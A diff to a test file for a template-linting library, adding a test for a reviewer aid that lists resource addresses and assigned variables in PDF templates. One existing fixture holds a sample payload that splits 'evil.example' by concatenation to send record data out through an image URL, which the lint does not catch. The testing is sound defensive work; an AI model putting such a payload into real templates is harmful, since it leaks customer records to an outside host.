@@ -1,6 +1,6 @@
 import { readFile } from "node:fs/promises";
 import { describe, expect, it } from "vitest";
-import { SELECT_RECORD_TYPES, SdfSpecError, fieldArtifact, templateArtifact, templateSourceIssues, withRequiredFeatures } from "../src";
+import { SELECT_RECORD_TYPES, SdfSpecError, fieldArtifact, templateArtifact, templateReviewPoints, templateSourceIssues, withRequiredFeatures } from "../src";
 
 const INVOICE_SOURCE = `<?xml version="1.0"?>
 <!DOCTYPE pdf PUBLIC "-//big.faceless.org//report" "report-1.1.dtd">
@@ -193,6 +193,17 @@ describe("acceptance loop attempt 3 fixes", () => {
   it("cannot see through a shadowed variable: a documented limit of the lint, closed by PR review and the preview's rendered check", () => {
     const shadowed = withSnippet('<#assign companyInformation = {"logoUrl": "htt" + "ps://evil.example/" + record.entity}><img src="${companyInformation.logoUrl}"/>');
     expect(templateSourceIssues(shadowed)).toEqual([]);
+  });
+
+  it("lists every resource address and assigned variable for the reviewer, shadowing included", () => {
+    const shadowed = withSnippet(
+      '<#assign companyInformation = {"logoUrl": "x"}><img src="${companyInformation.logoUrl}"/><link href="&#47;core/media/a.css"/>' +
+        '<p style="background: url(\'/core/media/b.png\')"/>',
+    );
+    expect(templateReviewPoints(shadowed)).toEqual({
+      resources: ["${companyInformation.logoUrl}", "/core/media/a.css", "/core/media/b.png"],
+      assignments: ["companyInformation"],
+    });
   });
 
   it("allows a NetSuite address with a port", () => {
